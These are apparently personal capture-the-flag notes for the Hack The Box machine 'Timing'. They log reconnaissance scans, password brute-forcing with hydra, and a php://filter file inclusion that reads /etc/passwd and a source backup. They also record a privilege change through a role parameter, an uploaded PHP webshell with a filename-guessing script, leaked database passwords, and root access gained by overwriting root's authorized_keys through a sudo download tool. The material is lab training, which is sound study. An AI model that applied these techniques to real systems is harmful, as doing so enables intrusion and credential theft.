# scanning
* `TCP` Scan
TARGET=10.10.11.135 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Simple WebApp
|_Requested resource was ./login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

> dirsearch -u http://10.10.11.135 -e php,html,txt,sql -w /usr/share/wordlists/dirb/common.txt -f

[08:21:28] 301 -  310B  - /css  ->  http://10.10.11.135/css/
[08:21:38] 200 -    4KB - /footer.php
[08:21:44] 200 -    0B  - /image.php
[08:21:44] 301 -  313B  - /images  ->  http://10.10.11.135/images/
[08:21:47] 301 -  309B  - /js  ->  http://10.10.11.135/js/
[08:21:50] 200 -    5KB - /login.php


> sqlmap -u http://10.10.11.135/login.php?login=true -p user,password --data "user=1&password=2" --method POST

> nmap 10.10.11.135 -Pn -sU -vvv



> nikto -host http://10.10.11.135
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.135
+ Target Hostname:    10.10.11.135
+ Target Port:        80
+ Start Time:         2022-01-11 08:47:10 (GMT13)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ Root page / redirects to: ./login.php
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7897 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2022-01-11 08:56:46 (GMT13) (576 seconds)
---------------------------------------------------------------------------


* when login as valid user, the time is longer
`admin` is a valid user

hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt 10.10.11.135 http-post-form "/login.php:user=^USER^&password=^PASS^:F=Invalid"


> http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=//etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
```

* web login as `aaron:aaron`

```
POST /profile_update.php HTTP/1.1

Host: 10.10.11.135

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-type: application/x-www-form-urlencoded

Content-Length: 52

Origin: http://10.10.11.135

DNT: 1

Connection: close

Referer: http://10.10.11.135/profile.php

Cookie: PHPSESSID=mog7evir8qssh5hemag12ocm4n



firstName=test&lastName=test&email=test&company=test


HTTP/1.1 200 OK

Date: Tue, 11 Jan 2022 02:32:24 GMT

Server: Apache/2.4.29 (Ubuntu)

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate

Pragma: no-cache

Vary: Accept-Encoding

Content-Length: 419

Connection: close

Content-Type: text/html; charset=UTF-8



{
    "id": "2",
    "0": "2",
    "username": "aaron",
    "1": "aaron",
    "password": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "2": "$2y$10$kbs9MM.M8G.aquRLu53QYO.9tZNFvALOIAb3LwLggUs58OH5mVUFq",
    "lastName": "test",
    "3": "test",
    "firstName": "test",
    "4": "test",
    "email": "test",
    "5": "test",
    "role": "0",
    "6": "0",
    "company": "test",
    "7": "test"
}
```

* post with role=1, get http://10.10.11.135/avatar_uploader.php

* generate a simple php webshell and save it as file.jpg
* upload through the admin panel and create a php script to generate all possible filenames
```php
<?php
$upload_dir = "images/uploads/";

$time_ref = time();
// echo $time_ref . "\xA";
$numbers = range($time_ref - 1000, $time_ref + 1000);
foreach ($numbers as $number) {
    $file_name = md5('$file_hash' . $number) . '_' . basename('file.jpg');
    $target_file = $upload_dir . $file_name;
    $error = "";
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
    print $target_file . "\xA";
}
?>
```

* find the uploaded file using dirsearch and call from web
> http://10.10.11.135/image.php?img=images/uploads/4c72a622a8a2843e7b462507a79c10c4_file.jpg&c=ls


```
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');

```
* donwload the source backup
> http://10.10.11.135/image.php?img=php://filter/convert.base64-encode/resource=/opt/source-files-backup.zip
* decode it
> cat source-b64 | base64 -d >  source.zip

> git diff 16de2698b5b122c93461298eab730d00273bd83e e4e214696159a25c69812571c8214d2bf8736a3f
diff --git a/db_conn.php b/db_conn.php
index 5397ffa..f1c9217 100644
--- a/db_conn.php
+++ b/db_conn.php
@@ -1,2 +1,2 @@
 <?php
-$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');

`aaron:S3cr3t_unGu3ss4bl3_p422w0Rd`

# user

# pe
aaron@timing:~$ sudo -lk
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils
aaron@timing:~$ ls -ls
total 4
4 -rw-r----- 1 root aaron 33 Jan 10 04:34 user.txt
aaron@timing:~$ ls -ls s^?/usr/bin/netutils
ls: cannot access 's'$'\177''/usr/bin/netutils': No such file or directory
aaron@timing:~$ ls -ls /usr/bin/netutils
4 -rwxr-xr-x 1 root root 42 Oct  5 15:03 /usr/bin/netutils

```
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 

> 0 
java -jar /root/netutils.jar

> 1
/root/axel http:///root/root.txt
```


## on target
> ln -s /root/.ssh/authorized_keys keys

> sudo /usr/bin/netutils
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: 10.10.x.x/keys
Initializing download: http://10.10.x.x/keys
File size: 563 bytes
Opening output file keys
Server unsupported, starting from scratch with one connection.
Starting download


Downloaded 563 byte in 0 seconds. (1.83 KB/s)


## on kali
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:PVarOaym2a7uYYt+eu402BAV5wE26R3HStHzHw1VivE root@kali
The key's randomart image is:
+---[RSA 3072]----+
|      *+++  .  .+|
|     o.+o.=  +.. |
|    .. o.+ oo Eo |
|     .. o. .... .|
|    .   S + .. . |
|     +   o +  .  |
|    . *   =      |
|     +o*.. .     |
|   .+OX=+        |
+----[SHA256]-----+
root@kali:~/workspace/htb-Timing# cp ~/.ssh/id_rsa.pub keys
root@kali:~/workspace/htb-Timing# python3 -m http.server 80
> ssh root@10.10.11.135 -i ~/.ssh/id_rsa

root@timing:~# cat root.txt 

# ref
https://0xdedinfosec.vercel.app/posts/hackthebox-timing-writeup
